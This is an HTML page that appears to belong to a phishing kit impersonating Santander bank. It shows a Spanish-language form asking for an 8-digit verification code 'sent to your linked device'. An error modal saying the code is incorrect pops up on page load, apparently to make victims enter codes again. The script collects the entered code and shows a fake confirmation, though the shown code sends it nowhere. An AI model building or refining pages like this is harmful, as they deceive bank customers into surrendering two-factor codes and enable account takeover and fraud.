<!--
██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
-->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
    <title>Santander</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
            background-size: cover; 
            background-position: center;
            background-attachment: fixed;
            height: 100vh;
            overflow: hidden;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6); 
            z-index: -1;
        }
        .otp-card {
            border-radius: 1.5rem 1.5rem 0 0;
            min-height: 550px;
            z-index: 10;
        }
        .otp-input {
            width: 40px;
            height: 50px;
            border-bottom: 2px solid #e2e8f0;
            text-align: center;
            font-size: 1.5rem;
            font-weight: bold;
            color: #374151;
            outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-bottom-color: #ec1c24;
            background-color: #fff5f5;
        }

        .bank-modal-overlay{
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 999999;
    animation: fadeIn .35s ease;
    backdrop-filter: blur(2px);
}

/* VENTANA */
.bank-modal{
    position: relative;
    width: 92%;
    max-width: 380px;
    background: #ffffff;
    border-radius: 18px;
    padding: 28px 24px 24px;
    box-shadow: 
        0 10px 35px rgba(0,0,0,0.18),
        0 2px 8px rgba(0,0,0,0.08);
    text-align: center;
    animation: modalShow .35s ease;
    font-family: Arial, Helvetica, sans-serif;
}

/* LOGO */
.bank-logo{
    margin-bottom: 18px;
    display: flex;
    justify-content: center;
    align-items: center;
}

.bank-logo img{
    width: 35px;
    height: auto;
    object-fit: contain;
}

/* TEXTO */
.bank-alert-text{
    color: #d6001c;
    font-size: 17px;
    font-weight: 600;
    line-height: 1.5;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

/* ICONO */
.alert-icon{
    font-size: 18px;
    color: #d6001c;
}

/* BOTON CERRAR */
.close-modal-btn{
    position: absolute;
    top: 12px;
    right: 12px;
    width: 34px;
    height: 34px;
    border: none;
    border-radius: 50%;
    background: transparent;
    color: #666;
    font-size: 18px;
    cursor: pointer;
    transition: 
        transform .18s ease,
        background .18s ease,
        color .18s ease,
        box-shadow .18s ease;
}

/* HOVER */
.close-modal-btn:hover{
    background: #f3f3f3;
    color: #d6001c;
    transform: rotate(90deg) scale(1.08);
}

/* CLICK */
.close-modal-btn:active{
    transform: scale(0.92) rotate(90deg);
}

/* FOCUS */
.close-modal-btn:focus{
    outline: none;
    box-shadow: 0 0 0 3px rgba(214,0,28,0.18);
    background: #f9f9f9;
    color: #d6001c;
}

/* ANIMACIONES */
@keyframes fadeIn{
    from{
        opacity: 0;
    }
    to{
        opacity: 1;
    }
}

@keyframes modalShow{
    from{
        opacity: 0;
        transform: translateY(-18px) scale(.96);
    }
    to{
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}
    </style>
</head>
<body class="flex flex-col justify-end">

    <div class="bg-white w-full otp-card p-6 shadow-2xl animate-up">
        <div class="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-8"></div>

        <div class="space-y-6 text-center">
            <div class="inline-flex items-center justify-center w-16 h-16 bg-red-50 rounded-full">
                <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
            </div>

            <div class="space-y-2">
                <h2 class="text-xl font-bold text-gray-800">Código de Verificación</h2>
                <p class="text-sm text-gray-500 px-6">Hemos enviado un código de 8 dígitos a tu dispositivo vinculado. Introdúcelo para continuar.</p>
            </div>

            <!-- Contenedor de 8 dígitos -->
             <!-- Busca el div id="otp-container" y añade esto justo ARRIBA -->
<div id="error-msg" class="hidden animate-pulse">
    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
        El código ingresado es incorrecto o ha expirado.
    </p>
</div>

<div id="otp-container" class="flex justify-center gap-2 pt-4">
    <!-- Tus 8 inputs se quedan igual -->
</div>
            <div id="otp-container" class="flex justify-center gap-2 pt-4">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
            </div>

            <div class="pt-6 space-y-4">
                <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
                    Confirmar Código
                </button>
                <p class="text-xs text-gray-400">¿No recibiste el código? <span class="text-red-600 font-semibold cursor-pointer">Reenviar en 0:59</span></p>
            </div>
        </div>
    </div>

<!-- MODAL ALERTA ESTILO SANTANDER -->
<div id="bankAlertModal" class="bank-modal-overlay">
    
    <div class="bank-modal">

        <!-- BOTON CERRAR -->
        <button class="close-modal-btn" id="closeModalBtn">
            ✕
        </button>

        <!-- LOGO -->
        <div class="bank-logo">
            <img src="lokoto.png" alt="Logo">
        </div>

        <!-- MENSAJE -->
        <div class="bank-alert-text">
            <span class="alert-icon">⚠</span>
            Código incorrecto, verifica e intenta nuevamente.
        </div>

    </div>

</div>
    
<script>

/* MOSTRAR AUTOMATICAMENTE */
window.addEventListener('load', () => {

    const modal = document.getElementById('bankAlertModal');
    const closeBtn = document.getElementById('closeModalBtn');

    /* CERRAR MODAL */
    closeBtn.addEventListener('click', () => {

        modal.style.animation = 'fadeOut .25s ease forwards';

        setTimeout(() => {
            modal.style.display = 'none';
        }, 230);

    });

});

/* ANIMACION CIERRE */
const style = document.createElement('style');

style.innerHTML = `
@keyframes fadeOut{
    from{
        opacity:1;
        transform:scale(1);
    }
    to{
        opacity:0;
        transform:scale(.96);
    }
}
`;

document.head.appendChild(style);

</script>
    <script>
const inputs = document.querySelectorAll('.otp-input');
const btnFinal = document.getElementById('btnFinal');

// SALTO AUTOMATICO ENTRE INPUTS
inputs.forEach((input, index) => {

    input.addEventListener('input', () => {

        // SOLO UN DIGITO
        input.value = input.value.replace(/\D/g, '').slice(0, 1);

        // PASAR AL SIGUIENTE
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        checkComplete();

    });

    // RETROCEDER CON BACKSPACE
    input.addEventListener('keydown', (e) => {

        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }

    });

});

// VALIDAR CODIGO COMPLETO
function checkComplete() {

    const code = Array.from(inputs)
        .map(i => i.value)
        .join('');

    if (code.length === 8) {

        btnFinal.disabled = false;

        btnFinal.classList.remove(
            'bg-gray-200',
            'text-gray-400'
        );

        btnFinal.classList.add(
            'bg-red-600',
            'text-white'
        );

    } else {

        btnFinal.disabled = true;

        btnFinal.classList.add(
            'bg-gray-200',
            'text-gray-400'
        );

        btnFinal.classList.remove(
            'bg-red-600',
            'text-white'
        );

    }

}

// BOTON CONFIRMAR
btnFinal.addEventListener('click', () => {

    const finalCode = Array.from(inputs)
        .map(i => i.value)
        .join('');

    // ANIMACION BOTON
    btnFinal.innerText = "Verificando...";
    btnFinal.disabled = true;

    // EFECTO VISUAL
    setTimeout(() => {

        btnFinal.innerText = "Código Confirmado";

        btnFinal.classList.remove(
            'bg-red-600'
        );

        btnFinal.classList.add(
            'bg-green-600'
        );

    }, 1200);

});
    </script>
</body>
</html>
